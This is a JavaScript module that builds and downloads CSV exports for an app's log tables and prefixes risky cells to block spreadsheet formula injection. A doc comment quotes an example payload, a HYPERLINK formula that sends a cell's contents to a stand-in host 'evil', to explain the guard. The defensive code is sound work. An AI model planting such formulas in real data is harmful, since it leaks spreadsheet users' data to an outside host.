// csvExport — one copy of the client-side CSV builder used by the log
// tables (MomentsTable always; ActivityTable when a view-only filter is
// active and the server-streamed export can't reproduce the view).
//
// Matches the server-side exports' conventions: CRLF line endings and a
// spreadsheet-injection guard on leading =,+,-,@,tab,CR characters.

// A plain number (optionally signed, decimal, exponent). Excel and Sheets read
// it as a number, never as a formula, so it keeps its sign: guarding "-0.42"
// would turn every negative valence or z-score into text.
const PLAIN_NUMBER = /^[+-]?(?:\d+\.?\d*|\.\d+)(?:[eE][+-]?\d+)?$/;

/**
 * Neutralise a cell that a spreadsheet would evaluate. A leading = + - @ tab
 * or CR makes Excel/Sheets/LibreOffice treat the text as a formula, so a
 * learner's `=HYPERLINK("https://evil/?"&B2,"details")` in a name or an
 * answer would run on the educator's machine; quoting does not stop it. A
 * leading apostrophe makes it text. Plain numbers pass through.
 *
 * The single guard every client CSV builder uses (security audit 2026-10-26,
 * L5-02/L7-14).
 *
 * @param {string} s
 * @returns {string}
 */
export function neutraliseFormula(s) {
    if (/^[=+\-@\t\r]/.test(s) && !PLAIN_NUMBER.test(s)) return "'" + s;
    return s;
}

export function csvEscape(value) {
    if (value === null || value === undefined) return '';
    const s = neutraliseFormula(typeof value === 'object' ? JSON.stringify(value) : String(value));
    if (/[",\r\n]/.test(s)) return '"' + s.replace(/"/g, '""') + '"';
    return s;
}

/** Build a CSV string with a fixed field order from an array of row objects. */
export function buildCsv(rows, fields) {
    const header = fields.join(',');
    const lines = rows.map((row) => fields.map((f) => csvEscape(row[f])).join(','));
    return [header, ...lines].join('\r\n');
}

/** Trigger a browser download of a CSV string. */
export function downloadCsv(csv, filename) {
    const blob = new Blob([csv], { type: 'text/csv;charset=utf-8' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    a.click();
    URL.revokeObjectURL(url);
}
